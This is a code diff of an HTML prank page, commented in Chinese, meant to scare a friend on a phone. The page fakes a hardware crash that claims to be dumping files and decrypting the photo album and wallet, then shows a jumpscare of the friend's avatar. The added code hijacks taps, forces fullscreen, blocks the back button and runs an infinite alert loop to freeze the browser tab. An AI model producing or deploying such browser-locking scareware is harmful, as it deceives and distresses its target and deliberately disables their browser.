@@ -2,94 +2,39 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FATAL_CORE_DUMP_0x000000F2</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CRITICAL_SYSTEM_HALT</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            user-select: none; /* 禁用长按选择，防止露馅 */
+            -webkit-touch-callout: none;
         }
 
         body {
             background-color: #000000;
-            color: #fa2222;
-            font-family: 'Courier New', Courier, monospace, sans-serif;
+            color: #ff2222;
+            font-family: monospace, sans-serif;
             height: 100vh;
+            width: 100vw;
             overflow: hidden;
+            position: fixed; /* 锁定视口，防止手机端橡皮筋下拉刷新效果 */
             display: flex;
             justify-content: center;
             align-items: center;
-            cursor: none; /* 隐藏鼠标，切断控制感 */
         }
 
-        /* 背景微弱闪烁的扫描线，增加真实硬件损坏感 */
-        .scanlines {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.4) 50%);
-            background-size: 100% 4px;
-            z-index: 1;
-            pointer-events: none;
-        }
-
-        /* 阶段 1：内核崩溃底层伪装 */
+        /* 阶段 1：底层崩溃伪装 */
         #stage-1 {
-            position: relative;
-            z-index: 5;
-            width: 95%;
-            max-width: 900px;
-            padding: 20px;
-            background: #020202;
-            border: 1px solid #ff0000;
-            box-shadow: inset 0 0 20px rgba(255, 0, 0, 0.2);
+            width: 90%;
+            font-size: 0.8rem;
+            line-height: 1.6;
+            color: #777;
         }
 
-        .code-dump {
-            font-size: 0.85rem;
-            line-height: 1.5;
-            color: #888;
-            margin-bottom: 15px;
-            font-family: monospace;
-            word-break: break-all;
-        }
-
-        .alert-text {
-            color: #ff1111;
-            font-weight: bold;
-            font-size: 1.1rem;
-            margin: 10px 0;
-            animation: text-flicker 0.15s infinite;
-        }
-
-        /* 正在被解析截取的朋友头像 */
-        .target-box {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            background: rgba(255, 0, 0, 0.05);
-            border: 1px solid rgba(255, 0, 0, 0.3);
-            padding: 15px;
-            margin: 15px 0;
-        }
-
-        .avatar-glitch {
-            width: 70px;
-            height: 70px;
-            border: 1px solid #ff0000;
-            background-image: url('friend_avatar.jpg');
-            background-size: cover;
-            background-position: center;
-            filter: grayscale(1) contrast(1.5) brightness(0.8); /* 强制黑白高对比，营造阴森感 */
-        }
-
-        .glitch-code {
-            color: #555;
-            font-size: 0.75rem;
-        }
-
-        /* 阶段 2：强制全屏恐怖降临（初始隐藏） */
+        /* 阶段 2：全屏惊悚爆发（初始隐藏） */
         #stage-2 {
             display: none;
             position: fixed;
@@ -100,87 +45,51 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            cursor: none;
         }
 
-        /* 惊悚处理的放大头像 */
         .avatar-jumpscare {
-            width: 320px;
-            height: 320px;
+            width: 75vw;
+            height: 75vw;
+            max-width: 300px;
+            max-height: 300px;
             border: 2px solid #ff0000;
-            background-image: url('friend_avatar.jpg');
+            background-image: url('friend_avatar.jpg'); /* 你的朋友头像 */
             background-size: cover;
             background-position: center;
-            filter: grayscale(1) contrast(2) brightness(0.6) sepia(0.3) hue-rotate(-30deg); /* 阴暗、血腥滤镜 */
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.4);
-            margin-bottom: 30px;
-            position: relative;
-        }
-
-        /* 头像上叠加的破坏红线 */
-        .avatar-jumpscare::after {
-            content: '';
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.15), rgba(255,0,0,0.15) 2px, transparent 2px, transparent 4px);
+            filter: grayscale(1) contrast(2.5) brightness(0.5) sepia(0.4) hue-rotate(-30deg);
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
+            margin-bottom: 40px;
         }
 
         .critical-message {
-            font-size: 1.3rem;
+            font-size: 1.1rem;
             color: #ff0000;
-            letter-spacing: 3px;
             text-align: center;
             font-weight: bold;
             line-height: 1.8;
-        }
-
-        @keyframes text-flicker {
-            0% { opacity: 1; }
-            50% { opacity: 0.8; }
-            100% { opacity: 1; }
+            letter-spacing: 2px;
         }
     </style>
 </head>
 <body>
 
-    <div class="scanlines"></div>
-
-    <!-- 阶段 1 -->
     <div id="stage-1">
-        <div class="code-dump">
-            0x000000F2: HARDWARE_HARD_FAILURE_DETECTED // CRITICAL_KERNEL_MELTDOWN<br>
-            STACK_DUMP: [7f8c9d0e1f2a] [00007ff7] [ffffffff] [8b45ff0c] [89442410]<br>
-            EIP: 0x00401230 ESP: 0x0012FF7C EBP: 0x0012FF94 EAX: 0x00000001<br>
-            %EAX=00000000 %EBX=7ffd6000 %ECX=01201d48 %EDX=01201cc0 %ESI=00000000
-        </div>
-        
-        <div class="alert-text">>>> SYSTEM RECOVERY FAILED. MEMORY CORRUPTION IN PROGRESS...</div>
-        
-        <div class="code-dump" style="color: #444;">
-            鎹掓湰鏈烘暟鎹凡鎹熸瘉_鑴変冲櫒閿欒_c0000005_ACCESS_VIOLATION_POTENTIAL_LEAK<br>
-            正在强行导出硬件密钥... 100% (MD5_SUM: d9c699f18a8f98)
-        </div>
-
-        <div class="target-box">
-            <div class="avatar-glitch"></div>
-            <div>
-                <div style="color: #ff0000; font-weight: bold; font-size: 0.95rem; margin-bottom: 5px;">[TARGET_LOCKED] 物理底层配置文件已被强行接管:</div>
-                <div class="glitch-code">IDENTITY_HASH: //_LOCATING_LOCAL_USER_DATA_SUCCESSFUL_</div>
-            </div>
-        </div>
-
-        <div class="code-dump" style="margin-top: 10px;">
-            [FATAL] CLICK ANYWHERE TO ABORT_SYSTEM_REFORMAT (试图拦截底层格式化进程...)
+        <div>[CRITICAL_ERR] ACCESS_VIOLATION_0x0029F1A</div>
+        <div style="color: #ff1111; margin: 10px 0; font-weight: bold;">>>> PHONE_STORAGE_MEM_OVERFLOW // 硬件底层致命冲突</div>
+        <div style="color: #444; font-size: 0.75rem;">
+            鎹掓湰鏈烘暟鎹... [DUMPING_LOCAL_FILES]<br>
+            正在强行解密相册与社交钱包... 89%<br>
+            [警告] 触控芯片已被强行锁定，点击屏幕重置硬件。
         </div>
     </div>
 
-    <!-- 阶段 2：强制全屏极端压迫界面 -->
     <div id="stage-2">
         <div class="avatar-jumpscare"></div>
         <div class="critical-message">
             CORE_SYSTEM_DESTROYED.<br>
-            <span style="font-size: 0.9rem; color: #555; font-weight: normal;">[ 该物理终端用户配置已被彻底破坏，本地数据已失效 ]</span>
+            <span style="font-size: 0.75rem; color: #444; font-weight: normal; display:block; margin-top:10px;">
+                [ 硬件中断：触控层与电源管理层已失效 ]
+            </span>
         </div>
     </div>
 
@@ -188,29 +97,47 @@
         const stage1 = document.getElementById('stage-1');
         const stage2 = document.getElementById('stage-2');
 
-        // 创建覆盖全屏的隐形点击层，确保任何操作都无法逃脱
-        const fullscreenTrigger = document.createElement('div');
-        fullscreenTrigger.style.position = 'fixed';
-        fullscreenTrigger.style.top = '0'; fullscreenTrigger.style.left = '0';
-        fullscreenTrigger.style.width = '100vw'; fullscreenTrigger.style.height = '100vh';
-        fullscreenTrigger.style.zIndex = '9';
-        document.body.appendChild(fullscreenTrigger);
+        // 1. 强制全屏劫持层
+        const triggerArea = document.createElement('div');
+        triggerArea.style.position = 'fixed';
+        triggerArea.style.top = '0'; triggerArea.style.left = '0';
+        triggerArea.style.width = '100vw'; triggerArea.style.height = '100vh';
+        triggerArea.style.zIndex = '999';
+        document.body.appendChild(triggerArea);
 
-        const executeDestruction = () => {
-            // 劫持浏览器进入全屏
+        const lockAndDestroy = (e) => {
+            e.preventDefault();
+            
+            // 尝试触发全屏（部分手机浏览器支持）
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
             } else if (document.documentElement.webkitRequestFullscreen) {
                 document.documentElement.webkitRequestFullscreen();
             }
 
-            // 切换到冰冷死寂状态
             stage1.style.display = 'none';
-            fullscreenTrigger.style.display = 'none';
             stage2.style.display = 'flex';
+
+            // 2. 核心手机整蛊逻辑：无限弹窗循环（锁死浏览器）
+            // 当他进入第二阶段后，只要稍微碰一下屏幕想划走，就会疯狂触发这个无限弹窗，直接卡死他的当前网页标签页
+            setTimeout(() => {
+                while(true) {
+                    alert("【⚠️ 致命错误】当前物理终端已彻底损坏。");
+                }
+            }, 500);
         };
 
-        fullscreenTrigger.addEventListener('click', executeDestruction);
+        // 绑定触摸和点击事件，确保在手机上绝对触发
+        triggerArea.addEventListener('touchstart', lockAndDestroy, { passive: false });
+        triggerArea.addEventListener('click', lockAndDestroy);
+
+        // 3. 拦截手机浏览器的“后退”历史记录
+        // 如果他用自带浏览器的后退键，会被强制留在当前页
+        window.history.pushState(null, null, window.location.href);
+        window.addEventListener('popstate', function () {
+            window.history.pushState(null, null, window.location.href);
+            alert("【⚠️ 错误】无法执行回退：底层数据链已断开。");
+        });
     </script>
 
 </body>
